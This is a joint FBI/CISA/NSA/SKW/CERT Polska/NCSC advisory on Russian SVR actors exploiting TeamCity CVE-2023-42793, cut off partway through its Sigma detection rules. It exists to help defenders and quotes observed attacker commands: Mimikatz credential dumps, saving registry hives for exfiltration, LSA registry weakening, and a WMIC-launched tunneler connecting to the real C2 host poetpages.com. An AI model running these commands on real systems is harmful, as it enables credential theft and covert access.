{
  "markdown": "\nSUMMARY\nThe U.S. Federal Bureau of Investigation (FBI), U.S. Cybersecurity & Infrastructure Security Agency (CISA), U.S. National Security Agency (NSA), Polish Military Counterintelligence Service (SKW), CERT Polska (CERT.PL), and the UK\u2019s National Cyber Security Centre (NCSC) assess Russian Foreign Intelligence Service (SVR) cyber actors\u2014also known as Advanced Persistent Threat 29 (APT 29), the Dukes, CozyBear, and NOBELIUM/Midnight Blizzard\u2014are exploiting CVE-2023-42793\u00a0at a large scale, targeting servers hosting JetBrains TeamCity software since September 2023.\nSoftware developers use TeamCity software to manage and automate software compilation, building, testing, and releasing. If compromised, access to a TeamCity server would provide malicious actors with access to that software developer\u2019s source code, signing certificates, and the ability to subvert software compilation and deployment processes\u2014access a malicious actor could further use to conduct supply chain operations. Although the SVR used such access to compromise SolarWinds and its customers in 2020, limited number and seemingly opportunistic types of victims currently identified, indicate that the SVR has not used the access afforded by the TeamCity CVE in a similar manner. The SVR has, however, been observed using the initial access gleaned by exploiting the TeamCity CVE to escalate its privileges, move laterally, deploy additional backdoors, and take other steps to ensure persistent and long-term access to the compromised network environments.\nTo bring Russia\u2019s actions to public attention, the authoring agencies are providing information on the SVR\u2019s most recent compromise to aid organizations in conducting their own investigations and securing their networks, provide compromised entities with actionable indicators of compromise (IOCs), and empower private sector cybersecurity companies to better detect and counter the SVR\u2019s malicious actions. The authoring agencies recommend all organizations with affected systems that did not immediately apply available patches or workarounds to assume compromise and initiate threat hunting activities using the IOCs provided in this CSA. If potential compromise is detected, administrators should apply the incident response recommendations included in this CSA and report key findings to the FBI and CISA.\nDownload the PDF version of this report:\n\n\nAA23-347A Russian Foreign Intelligence Service (SVR) Exploiting JetBrains TeamCity CVE Globally\n(PDF,       774.65 KB\n  )\n\n\nFor a downloadable copy of IOCs, see:\n\n\nAA23-347A STIX XML\n(XML,       76.99 KB\n  )\n\n\n\n\nAA23-347A STIX JSON\n(JSON,       69.29 KB\n  )\n\n\nTHREAT OVERVIEW\nSVR cyber operations pose a persistent threat to public and private organizations\u2019 networks globally. Since 2013, cybersecurity companies and governments have reported on SVR operations targeting victim networks to steal confidential and proprietary information. A decade later, the authoring agencies can infer a long-term targeting pattern aimed at collecting, and enabling the collection of, foreign intelligence, a broad concept that for Russia encompasses information on the politics, economics, and military of foreign states; science and technology; and foreign counterintelligence. The SVR also conducts cyber operations targeting technology companies that enable future cyber operations.\nA decade ago, public reports about SVR cyber activity focused largely on the SVR\u2019s spear phishing operations, targeting government agencies, think tanks and policy analysis organizations, educational institutions, and political organizations. This category of targeting is consistent with the SVR\u2019s responsibility to collect political intelligence, the collection of which has long been the SVR\u2019s highest priority. For the Russian Government, political intelligence includes not only the development and execution of foreign policies, but also the development and execution of domestic policies and the political processes that drive them. In December 2016, the U.S. Government published a Joint Analysis Report titled \u201cGRIZZLY STEPPE \u2013 Russian Malicious Cyber Activity,\u201d which describes the SVR\u2019s compromise of a U.S. political party leading up to a presidential election. The SVR\u2019s use of spear phishing operations are visible today in its ongoing Diplomatic Orbiter campaign, primarily targeting diplomatic agencies. In 2023, SKW and CERT.PL published a Joint Analysis Report describing tools and techniques used by the SVR to target embassies in dozens of countries.\nLess frequently, reporting on SVR cyber activity has addressed other aspects of the SVR\u2019s foreign intelligence collection mission. In July 2020, U.S., U.K., and Canadian Governments jointly published an advisory revealing the SVR\u2019s exploitation of CVEs to gain initial access to networks, and its deployment of custom malware known as WellMess, WellMail, and Sorefang to target organizations involved in COVID-19 vaccine development.\u00a0Although not listed in the 2020 advisory did not mention it, the authoring agencies can now disclose that the SVR\u2019s WellMess campaign also targeted energy companies. Such biomedical and energy targets are consistent with the SVR\u2019s responsibility to support the Russian economy by pursuing two categories of foreign intelligence known as economic intelligence and science and technology.\nIn April 2021, the U.S. Government attributed a supply chain operation targeting the SolarWinds information technology company and its customers to the SVR. This attribution marked the discovery that the SVR had, since at least 2018, expanded the range of its cyber operations to include the widespread targeting of information technology companies. At least some of this targeting was aimed at enabling additional cyber operations. Following this attribution, the U.S. and U.K. Governments published advisories highlighting additional SVR TTPs, including its exploitation of various CVEs, the SVR\u2019s use of \u201clow and slow\u201d password spraying techniques to gain initial access to some victims\u2019 networks, exploitation of a zero-day exploit, and exploitation of Microsoft 365 cloud environments.\nIn this newly attributed operation targeting networks hosting TeamCity servers, the SVR demonstrably continues its practice of targeting technology companies. By choosing to exploit CVE-2023-42793, a software development program, the authoring agencies assess the SVR could benefit from access to victims, particularly by allowing the threat actors to compromise the networks of dozens of software developers. JetBrains issued a patch for this CVE in mid-September 2023, limiting the SVR\u2019s operation to the exploitation of unpatched, Internet-reachable TeamCity servers. While the authoring agencies assess the SVR has not yet used its accesses to software developers to access customer networks and is likely still in the preparatory phase of its operation, having access to these companies\u2019 networks presents the SVR with opportunities to enable hard-to- detect command and control (C2) infrastructure.\nTECHNICAL DETAILS\nNote: This advisory uses the MITRE ATT&CK\u00ae for Enterprise framework, version 14. See the MITRE ATT&CK Tactics and Techniques section for a table of the threat actors\u2019 activity mapped to MITRE ATT&CK\u00ae tactics and techniques. For assistance with mapping malicious cyber activity to the MITRE ATT&CK framework, see CISA and MITRE ATT&CK\u2019s Best Practices for MITRE ATT&CK Mapping and CISA\u2019s Decider Tool. While SVR followed a similar playbook in each compromise, they also adjusted to each operating environment and not all presented steps or actions below were executed on every host.\nInitial Access - Exploitation\nThe SVR started to exploit Internet-connected JetBrains TeamCity servers [T1190] in late September 2023 using CVE-2023-42793, which enables the insecure handling of specific paths allowing for bypassing authorization, resulting in arbitrary code execution on the server. The authoring agencies' observations show that the TeamCity exploitation usually resulted in code execution [T1203] with high privileges\u00a0granting the SVR an advantageous foothold in the network environment. The authoring agencies are not currently aware of any other initial access vector to JetBrains TeamCity currently being exploited by the SVR.\nHost Reconnaissance\nInitial observations show the SVR used the following basic, built-in commands to perform host reconnaissance [T1033],[T1059.003],[T1592.002]:\n\nwhoami /priv\nwhoami /all\nwhoami /groups\nwhoami /domain\nnltest -dclist\nnltest -dsgetdc\ntasklist\nnetstat\nwmic /node:\"\"<redacted>\"\" /user:\"\"<redacted>\"\" /password:\"\"<redacted>\"\"\u00a0process list brief\nwmic /node:\"\"<redacted>\"\" process list brief\nwmic process get commandline -all\nwmic process <proc_id> get commandline\nwmic process where name=\"\"GoogleCrashHandler64.exe\"\" get commandline,processed\npowershell ([adsisearcher]\"((samaccountname=<redacted>))\").Findall().Properties\npowershell ([adsisearcher]\"((samaccountname=<redacted>))\").Findall().Properties.memberof\npowershell Get-WmiObject -Class Win32_Service -Computername\npowershell Get-WindowsDriver -Online -All\n\nFile Exfiltration\nAdditionally, the authoring agencies have observed the SVR exfiltrating files [T1041] which may provide insight into the host system\u2019s operating system:\n\nC:\\Windows\\system32\\ntoskrnl.exe\u00a0to precisely identify system version, likely as a prerequisite to deploy EDRSandBlast.\nSQL Server executable files - based on the review of the post exploitation actions, the SVR showed an interest in specific files of the SQL Server installed on the compromised systems:\n\nC:\\Program Files\\Microsoft SQL Server\\MSSQL14.MSSQLSERVER\\MSSQL\\Binn\\sqlmin.dll,\nC:\\Program Files\\Microsoft SQL Server\\MSSQL14.MSSQLSERVER\\MSSQL\\Binn\\sqllos.dll,\nC:\\Program Files\\Microsoft SQL Server\\MSSQL14.MSSQLSERVER\\MSSQL\\Binn\\sqllang.dll,\nC:\\Program Files\\Microsoft SQL Server\\MSSQL14.MSSQLSERVER\\MSSQL\\Binn\\sqltses.dll\nC:\\Program Files\\Microsoft SQL Server\\MSSQL14.MSSQLSERVER\\MSSQL\\Binn\\secforwarder.dll\n\n\nVisual Studio files \u2013 based on the review of the post exploitation actions, the SVR showed an interest in specific files of the Visual Studio:\n\nC:\\Program Files (x86)\\Microsoft Visual Studio\\2017\\SQL\\Common7\\IDE\\VSIXAutoUpdate.exe\nUpdate management agent files \u2013 based on the review of the post exploitation actions, the SVR showed an interest in executables and configuration of patch management software:\n\nC:\\Program Files (x86)\\PatchManagementInstallation\\Agent\\12\\Httpd\\bin\\httpd.exe\nC:\\Program Files (x86)\\PatchManagementInstallation\\Agent\\12\\Httpd\nC:\\ProgramData\\GFI\\LanGuard 12\\HttpdConfig\\httpd.conf\n\n\n\n\n\nInterest in SQL Server\nBased on the review of the exploitation, the SVR also showed an interest in details of the SQL Server [T1059.001],[T1505.001]:\n\npowershell Compress-Archive -Path \"C:\\Program Files\\Microsoft SQL Server\\MSSQL14.MSSQLSERVER\\MSSQL\\Binn\\sqlmin.dll\",\"C:\\Program Files\\Microsoft SQL Server\\MSSQL14.MSSQLSERVER\\MSSQL\\Binn\\sqllos.dll\",\"C:\\Program Files\\Microsoft SQL Server\\MSSQL14.MSSQLSERVER\\MSSQL\\Binn\\sqllang.dll\",\"C:\\Program Files\\Microsoft SQL Server\\MSSQL14.MSSQLSERVER\\MSSQL\\Binn\\sqltses.dll\" -DestinationPath C:\\Windows\\temp\\1\\sql.zip\nSVR cyber actors also exfiltrated secforwarder.dll\n\nTactics Used to Avoid Detection\nTo avoid detection, the SVR used a \u201cBring Your Own Vulnerable Driver\u201d [T1068] technique to disable or outright kill endpoint detection and response (EDR) and antivirus (AV) software [T1562.001].\nThis was done using an open source project called \u201cEDRSandBlast.\u201d\u00a0The authoring agencies have observed the SVR using EDRSandBlast to remove protected process light (PPL) protection, which is used for controlling and protecting running processes and protecting them from infection. The actors then inject code into AV/EDR processes for a small subset of victims [T1068]. Additionally, executables that are likely to be detected (i.e. Mimikatz) were executed in memory [T1003.001].\nIn several cases SVR attempted to hide their backdoors via:\n\nAbusing a DLL hijacking vulnerability in Zabbix\u00a0software by replacing a legitimate Zabbix DLL with their one containing GraphicalProton backdoor,\nBackdooring an open source application developed by Microsoft named vcperf. SVR modified and copied publicly available sourcecode. After execution, backdoored vcperf dropped several DLLs to disc, one of those being a GraphicalProton backdoor,\nAbusing a DLL hijacking vulnerability in Webroot\u00a0antivirus software by replacing a legitimate DLL with one containing GraphicalProton backdoor.\n\nTo avoid detection by network monitoring, the SVR devised a covert C2 channel that used Microsoft OneDrive and Dropbox cloud services. To further enable obfuscation, data exchanged with malware via OneDrive and Dropbox were hidden inside randomly generated BMP files [T1564], illustrated below:\n\n \n\n\nPrivilege Escalation\nTo facilitate privilege escalation [T1098], the SVR used multiple techniques, including WinPEAS,\u00a0NoLMHash registry key modification, and the Mimikatz tool.\nThe SVR modified the NoLMHash registry using the following reg command:\n\nreg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa /v NoLMHash /t REG_DWORD /d \"0\" /f\n\nThe SVR used the following Mimikatz commands [T1003]:\n\nprivilege::debug\nlsadump::cache\nlsadump::secrets\nlsadump::sam\nsekurlsa::logonpasswords\n\nPersistence\nThe SVR relied on scheduled tasks [T1053.005] to secure persistent execution of backdoors. Depending on the privileges the SVR had, their executables were stored in one of following directories:\n\nC:\\Windows\\temp\nC:\\Windows\\System32\nC:\\Windows\\WinStore\n\nThe SVR made all modifications using the schtasks.exe binary. It then had multiple variants of arguments passed to schtasks.exe, which can be found in Appendix B \u2013 Indicators of Compromise.\nTo secure long-term access to the environment, the SVR used the Rubeus\u00a0toolkit to craft Ticket Granting Tickets (TGTs) [T1558.001].\nSensitive Data Exfiltration [T1020]\nThe SVR exfiltrated the following Windows Registry hives from its victims [T1003]:\n\nHKLM\\SYSTEM\nHKLM\\SAM\nHKLM\\SECURITY\n\nIn order to exfiltrate Windows Registry, the SVR saved hives into files [T1003.002], packed them, and then exfiltrated them using a backdoor capability. it used \u201creg save\u201d to save SYSTEM, SAM and SECURITY registry hives, and used powershell to stage .zip archives in the C:\\Windows\\Temp\\ directory.\n\nreg save HKLM\\SYSTEM \"\"C:\\Windows\\temp\\1\\sy.sa\"\" /y\nreg save HKLM\\SAM \"\"C:\\Windows\\temp\\1\\sam.sa\"\" /y\nreg save HKLM\\SECURITY \"\"C:\\Windows\\temp\\1\\se.sa\"\" /y\npowershell Compress-Archive -Path C:\\Windows\\temp\\1\\ -DestinationPath C:\\Windows\\temp\\s.zip -Force & del C:\\Windows\\temp\\1 /F /Q\n\nIn a few specific cases, the SVR used the SharpChromium\u00a0tool to obtain sensitive browser data such as session cookies, browsing history, or saved logins.\nSVR also used DSInternals open source tool to interact with Directory Services. DSInternals\u00a0allows to obtain a sensitive Domain information.\nNetwork Reconnaissance\nAfter the SVR built a secure foothold and gained an awareness of a victim\u2019s TeamCity server, it then focused on network reconnaissance [T1590.004]. The SVR performed network reconnaissance using a mix of built-in commands and additional tools, such as port scanner and PowerSploit, which it launched into memory [T1046]. The SVR executed the following PowerSploit commands:\n\nGet-NetComputer\nGet-NetGroup\nGet-NetUser -UACFilter NOT_ACCOUNTDISABLE | select samaccountname, description, pwdlastset, logoncount, badpwdcount\"\nGet-NetDiDomain\nGet-AdUser\nGet-DomainUser -UserName\nGet-NetUser -PreauthNotRequire\nGet-NetComputer | select samaccountname\nGet-NetUser -SPN | select serviceprincipalname\n\nTunneling into Compromised Environments\nIn selected environments the SVR used an additional tool named, \u201crr.exe\u201d\u2014a modified open source reverse socks tunneler named Rsockstun\u2014to establish a tunnel to the C2 infrastructure [T1572].\nThe authoring agencies are aware of the following infrastructure used in conjunction with \u201crr.exe\u201d:\n\n65.20.97[.]203:443\nPoetpages[.]com:8443\n\nThe SVR executed Rsockstun either in memory or using the Windows Management Instrumentation Command Line (WMIC) [T1047] utility after dropping it to disk:\n\nwmic process call create \"C:\\Program Files\\Windows Defender Advanced Threat Protection\\Sense.exe -connect poetpages.com -pass M554-0sddsf2@34232fsl45t31\"\n\nLateral Movement\nThe SVR used WMIC to facilitate lateral movement [T1047],[T1210].\n\nwmic /node:\"\"<redacted>\"\" /user:\"\"<redacted>\" /password:\"\"<redacted>\"\" process call create \"\"rundll32 C:\\Windows\\system32\\AclNumsInvertHost.dll AclNumsInvertHost\"\"\n\nThe SVR also modified DisableRestrictedAdmin key to enable remote connections [T1210].\nIt modified Registry using the following reg command:\n\nreg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d \"0\" /f\n\nAdversary Toolset\nIn the course of the TeamCity operation, the SVR used multiple custom and open source available tools and backdoors. The following custom tools were observed in use during the operation:\n\nGraphicalProton\u00a0is a simplistic backdoor that uses OneDrive, Dropbox, and randomly generated BMPs [T1027.001] to exchange data with the SVR operator.\nAfter execution, GraphicalProton gathers environment information such as active TCP/UDP connections [T1049], running processes [T1049], as well as user, host, and domain names [T1590]. OneDrive is used as a primary communication channel while Dropbox is treated as a backup channel [T1567]. API keys are hardcoded into the malware. When communicating with cloud services, GraphicalProton\u00a0generates a randomly named directory which is used to store infection-specific BMP files - with both commands and results [T1564.001]. Directory name is re-randomized each time the GraphicalProton process is started.\nBMP files that were used to exchange data were generated in the following way:\n\n\nCompress data using zlib,\nEncrypt data using custom algorithm,\nAdd \u201c***\u201d string literal to encrypted data,\nCreate a random BMP with random rectangle,\nAnd finally, encode encrypted data within lower pixel bits.\n\nWhile the GraphicalProton backdoor has remained mostly unchanged over the months we have been tracking it, to avoid detection the adversary wrapped the tool in various different layers of obfuscation, encryption, encoders, and stagers. Two specific variants of GraphicalProton \u201cpackaging\u201d are especially noteworthy \u2013 a variant that uses DLL hijacking [T1574.002] in Zabbix as a means to start execution (and potentially provide long-term, hard-to-detect access) and a variant that masks itself within vcperf [T1036], an open-source C++ build analysis tool from Microsoft.\n\nGraphicalProton HTTPS variant \u2013 a variant of GraphicalProton backdoor recently introduced by the SVR that forgoes using cloud-based services as a C2 channel and instead relies on HTTP request.To legitimize the C2 channel, SVR used a re-registered expired domain set up with dummy WordPress website. Execution of HTTPS variant of GraphicalProton is split into two files \u2013 stager and encrypted binary file that contains further code.\n\n\nMITRE ATT&CK TACTICS AND TECHNIQUES\nSee below tables for all referenced threat actor tactics and techniques in this advisory. For additional mitigations, see the Mitigations section.\n\nTable 1: SVR Cyber Actors ATT&CK Techniques for Enterprise - Reconnaissance\n\n\nTechnique Title\nID\nUse\n\n\n\n\nGather Victim Network Information: Network Topology\nT1590.004\nSVR cyber actors may gather information about the victim\u2019s network topology that can be used during targeting.\n\n\nGather Victim Host Information: Software\nT1592.002\nSVR cyber actors may gather information about the victim\u2019s host networks that can be used during targeting.\n\n\n\n\nTable 2: SVR Cyber Actors\u2019 ATT&CK Techniques for Enterprise \u2013 Initial Access\n\n\nTechnique Title\nID\nUse\n\n\n\n\nExploit Public-Facing Application\nT1190\nSVR cyber actors exploit\u00a0internet-connected JetBrains TeamCity server using CVE-2023-42793 for initial access.\n\n\n\n\nTable 3: SVR Cyber Actors\u2019 ATT&CK Techniques for Enterprise: Execution\n\n\nTechnique Title\nID\nUse\n\n\n\n\nCommand and Scripting Interpreter: PowerShell\nT1059.001\nSVR cyber actors used powershell commands to compress Microsoft SQL server .dll files.\n\n\nCommand and Scripting Interpreter: Windows Command Shell\nT1059.003\n\nSVR cyber actors execute these powershell commands to perform host reconnaissance:\n\npowershell ([adsisearcher]\"((samaccountname=<redacted>))\").Findall().Properties\npowershell ([adsisearcher]\"((samaccountname=<redacted>))\").Findall().Properties.memberof\npowershell Get-WmiObject -Class Win32_Service -Computername\npowershell Get-WindowsDriver -Online -All\n\n\n\n\nExploitation for Client Execution\nT1203\nSVR cyber actors leverage arbitrary code execution after exploiting CVE-2023-42793.\n\n\nHijack Execution Flow: DLL Side-Loading\nT1574.002\nSVR cyber actors use a variant of GraphicalProton that uses DLL hijacking in Zabbix as a means to start execution.\n\n\n\n\nTable 4: SVR Cyber Actors\u2019 ATT&CK Techniques for Enterprise: Persistence\n\n\nTechnique Title\nID\nUse\n\n\n\n\nScheduled Task\nT1053.005\nSVR cyber actors may abuse Windows Task Schedule to perform task scheduling for initial or recurring execution of malicious code.\n\n\nServer Software Component: SQL Stored Procedures\nT1505.001\nSVR cyber actors abuse SQL server stored procedures to maintain persistence.\n\n\nBoot or Logon Autostart Execution\nT1547\nSVR cyber actors used C:\\Windows\\system32\\ntoskrnl.exe to configure automatic system boot settings to maintain persistence.\n\n\n\n\nTable 5: SVR Cyber Actors\u2019 ATT&CK Techniques for Enterprise: Privilege Escalation\n\n\nTechnique Title\nID\nUse\n\n\n\n\nExploitation for Privilege Escalation\nT1068\n\nSVR cyber actors exploit JetBrains TeamCity vulnerability to achieve escalated privileges.\nTo avoid detection, the SVR cyber actors used a \u201cBring Your Own Vulnerable Driver\u201d\u00a0 technique to disable EDR and AV defense mechanisms.\n\n\n\nAccount Manipulation\nT1098\nSVR cyber actors may manipulate accounts to maintain and/or elevate access to victim systems.\n\n\n\n\nTable 6: SVR Cyber Actors\u2019 ATT&CK Techniques for Enterprise: Defense Evasion\n\n\nTechnique Title\nID\nUse\n\n\n\n\nObfuscated Files or Information: Binary Padding\nT1027.001\nSVR cyber actors use BMPs to perform binary padding while exchange data is exfiltrated to an their C2 station.\n\n\nMasquerading\nT1036\nSVR cyber actors use a variant that uses DLL hijacking in Zabbix as a means to start execution (and potentially provide long-term, hard-to-detect access) and a variant that masks itself within vcperf,\u00a0an open-source C++ build analysis tool from Microsoft.\n\n\nProcess Injection\nT1055\nSVR cyber actors inject code into AV and EDR processes to evade defenses.\n\n\nDisable or Modify Tools\nT1562.001\nSVR cyber actors may modify and/or disable tools to avoid possible detection of their malware/tools and activities.\n\n\nHide Artifacts\nT1564\nSVR cyber actors may attempt to hide artifacts associated with their behaviors to evade detection.\n\n\nHide Artifacts: Hidden Files and Directories\nT1564.001\nWhen communicating with cloud services, GraphicalProton generates a randomly named directory which is used to store infection-specific BMP files - with both commands and results.\n\n\n\n\nTable 7: SVR Cyber actors\u2019 ATT&CK Techniques for Enterprise: Credential Access\n\n\nTechnique Title\nID\nUse\n\n\n\n\nOS Credential Dumping: LSASS Memory\nT1003.001\nSVR cyber actors executed Mimikatz commands in memory to gain access to credentials stored in memory.\n\n\nOS Credential Dumping: Security Account Manager\nT1003.002\n\nSVR cyber actors used:\n\nprivilege::debug\nlsadump::cache\nlsadump::secrets\nlsadump::sam\nsekurlsa::logonpasswords\n\nMimikatz commands to gain access to credentials.\nAdditionally, SVR cyber actors exfiltrated Windows registry hives to steal credentials.\n\nHKLM\\SYSTEM\nHKLM\\SAM\nHKLM\\SECURITY\n\n\n\n\nCredentials from Password Stores: Credentials from Web Browsers\nT1555.003\nIn a few specific cases, the SVR used the SharpChromium tool to obtain sensitive browser data such as session cookies, browsing history, or saved logins.\n\n\nSteal or Forge Kerberos Tickets: Golden Ticket\nT1558.001\nTo secure long-term access to the environment, the SVR used the Rubeus toolkit to craft Ticket Granting Tickets (TGTs).\n\n\n\n\nTable 8: SVR Cyber Actors ATT&CK Techniques for Enterprise: Discovery\n\n\nTechnique Title\nID\nUse\n\n\n\n\nSystem Owner/User Discovery\nT1033\nSVR cyber actors use these built-in commands to perform host reconnaissance:\u00a0whoami /priv, whoami / all, whoami / groups, whoami / domain to perform user discovery.\n\n\nNetwork Service Discovery\nT1046\nSVR cyber actors performed network reconnaissance using a mix of built-in commands and additional tools, such as port scanner and PowerSploit.\n\n\nProcess Discovery\nT1057\nSVR cyber actors use GraphicalProton to gather running processes data.\n\n\nGather Victim Network Information\nT1590\nSVR cyber actors use GraphicalProton to gather victim network information.\n\n\n\n\nTable 9: SVR Cyber Actors ATT&CK Techniques for Enterprise: Lateral Movement\n\n\nTechnique Title\nID\nUse\n\n\n\n\nExploitation of Remote Services\nT1210\nSVR cyber actors may exploit remote services to gain unauthorized access to internal systems once inside a network.\n\n\nWindows Management Instrumentation\nT1047\n\nSVR cyber actors executed Rsockstun either in memory or using Windows Management Instrumentation (WMI) to execute malicious commands and payloads.\nwmic process call create \"C:\\Program Files\\Windows Defender Advanced Threat Protection\\Sense.exe -connect poetpages.com -pass M554-0sddsf2@34232fsl45t31\"\n\n\n\n\n\nTable 10: SVR Cyber Actors ATT&CK Techniques for Enterprise: Command and Control\n\n\nTechnique Title\nID\nUse\n\n\n\n\nDynamic Resolution\nT1568\nSVR may dynamically establish connections to command-and-control infrastructure to evade common detections and remediations.\n\n\nProtocol Tunneling\nT1572\n\nSVR cyber actors may tunnel network communications to and from a victim system within a separate protocol to avoid detection/network filtering and/or enable access to otherwise unreachable systems.\nIn selected environments, the SVR used an additional tool named, \u201crr.exe\u201d\u2014a modified open source reverse socks tunneler named Rsockstunm\u2014to establish a tunnel to the C2 infrastructure.\n\n\n\n\n\nTable 11: SVR Cyber Actors ATT&CK Techniques for Enterprise: Exfiltration\n\n\nTechnique Title\nID\nUse\n\n\n\n\nAutomated Exfiltration\nT1020\nSVR cyber actors may exfiltrate data, such as sensitive documents, through the use of automated processing after being gathered during collection.\n\n\nExfiltration Over C2 Channel\nT1041\nSVR cyber actors may steal data by exfiltrating it over an existing C2 channel. Stolen data is encoded into normal communications using the same protocol as C2 communications.\n\n\nExfiltration Over Web Service\nT1567\nSVR cyber actors use OneDrive and Dropbox to exfiltrate data to their C2 station.\n\n\n\nINDICATORS OF COMPROMISE\nNote: Please refer to Appendix B for a list of IOCs.\nVICTIM TYPES\nAs a result of this latest SVR cyber activity, the FBI, CISA, NSA, SKW, CERT Polska, and NCSC have identified a few dozen compromised companies in the United States, Europe, Asia, and Australia, and are aware of over a hundred compromised devices though we assess this list does not represent the full set of compromised organizations. Generally, the victim types do not fit into any sort of pattern or trend, aside from having an unpatched, Internet-reachable JetBrains TeamCity server, leading to the assessment that SVR\u2019s exploitation of these victims\u2019 networks was opportunistic in nature and not necessarily a targeted attack. Identified victims included: an energy trade association; companies that provide software for billing, medical devices, customer care, employee monitoring, financial management, marketing, sales, and video games; as well as hosting companies, tools manufacturers, and small and large IT companies.\nDETECTION METHODS\nThe following rules can be used to detect activity linked to adversary activity. These rules should serve as examples and adapt to each organization\u2019s environment and telemetry.\nSIGMA Rules\n\n\n\n\ntitle: Privilege information listing via whoamidescription: Detects whoami.exe execution and listing of privilegesauthor:\u00a0references: https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/whoamidate: 2023/11/15logsource:\u00a0 \u00a0 category: process_creation\u00a0 \u00a0 product: windowsdetection:\u00a0 \u00a0 selection:\u00a0 \u00a0 \u00a0 \u00a0 Image|endswith:\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 - 'whoami.exe'\u00a0 \u00a0 \u00a0 \u00a0 CommandLine|contains:\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 - 'priv'\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 - 'PRIV'\u00a0 \u00a0 condition: selectionfalsepositives: legitimate use by system administrator\ntitle: DC listing via nltestdescription: Detects nltest.exe execution and DC listingauthor:\u00a0references:date: 2023/11/15logsource:\u00a0 \u00a0 category: process_creation\u00a0 \u00a0 product: windowsdetection:\u00a0 \u00a0 selection:\u00a0 \u00a0 \u00a0 \u00a0 Image|endswith:\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 - 'nltest.exe'\u00a0 \u00a0 \u00a0 \u00a0 CommandLine|re: '.*dclist\\:.*|.*DCLIST\\:.*|.*dsgetdc\\:.*|.*DSGETDC\\:.*'\u00a0 \u00a0 condition: selectionfalsepositives: legitimate use by system administrator\ntitle: DLL execution via WMIdescription: Detects DLL execution via WMIauthor:\u00a0references:date: 2023/11/15logsource:\u00a0 \u00a0 category: process_creation\u00a0 \u00a0 product: windowsdetection:\u00a0 \u00a0 selection:\u00a0 \u00a0 \u00a0 \u00a0 Image|endswith:\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 - 'WMIC.exe'\u00a0 \u00a0 \u00a0 \u00a0 CommandLine|contains|all:\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 - 'call'\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 - 'rundll32'\u00a0 \u00a0 condition: selectionfalsepositives: legitimate use by software or system administrator\ntitle: Process with connect and pass as argsdescription: Process with connect and pass as argsauthor:references:date: 2023/11/15logsource:\u00a0 \u00a0 category: process_creation\u00a0 \u00a0 product: windowsdetection:\u00a0 \u00a0 selection:\u00a0 \u00a0 \u00a0 \u00a0 CommandLine|contains|all:\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 - 'pass'\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 - 'connect'\u00a0 \u00a0 condition: selectionfalsepositives: legitimate use of rsockstun or software with exact same arguments\ntitle: Service or Drive enumeration via powershelldescription: Service or Drive enumeration via powershell\u00a0author:\u00a0references:date: 2023/11/15logsource:\u00a0 \u00a0 category: ps_script\u00a0 \u00a0 product: windowsdetection:\u00a0 \u00a0 selection_1:\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 ScriptBlockText|contains|all:\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 - 'Get-WmiObject'\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 - '-Class'\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 - 'Win32_Service'\u00a0 \u00a0 selection_2:\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 ScriptBlockText|contains|all:\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 - 'Get-WindowsDriver'\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 - '-Online'\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 - '-All'\u00a0 \u00a0 condition: selection_1 or selection_2falsepositives: legitimate use by system administrator\ntitle: Compressing files from temp to tempdescription: Compressing files from temp\\ to temp used by SVR to prepare data to be exfiltratedreferences:author:\u00a0date: 2023/11/15logsource:\u00a0 \u00a0 category: ps_script\u00a0 \u00a0 product: windowsdetection:\u00a0 \u00a0 selection:\u00a0 \u00a0 \u00a0 \u00a0 ScriptBlockText|re: '.*Compress\\-Archive.*Path.*Windows\\\\[Tt]{1}emp\\\\[1-9]{1}.*DestinationPath.*Windows\\\\[Tt]{1}emp\\\\.*'\u00a0 \u00a0 condition: selection\ntitle: DLL names used by SVR for GraphicalProton backdoordescription: Hunts for known SVR-specific DLL names.references:author:\u00a0date: 2023/11/15logsource:\u00a0 \u00a0 category: image_load\u00a0 \u00a0 product: windowsdetection:\u00a0 \u00a0 selection:\u00a0 \u00a0 \u00a0 \u00a0 ImageLoaded|endswith:\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 - 'AclNumsInvertHost.dll'\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 - 'ModeBitmapNumericAnimate.dll'\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 - 'UnregisterAncestorAppendAuto.dll'\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 - 'DeregisterSeekUsers.dll'\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 - 'ScrollbarHandleGet.dll'\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 - 'PerformanceCaptionApi.dll'\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 - 'WowIcmpRemoveReg.dll'\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 - 'BlendMonitorStringBuild.dll'\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 - 'HandleFrequencyAll.dll'\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 - 'HardSwapColor.dll'\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 - 'LengthInMemoryActivate.dll'\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 - 'ParametersNamesPopup.dll'\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 - 'ModeFolderSignMove.dll'\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 - 'ChildPaletteConnected.dll'\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 - 'AddressResourcesSpec.dll'\u00a0 \u00a0 condition: selection\ntitle: Sensitive registry entries saved to 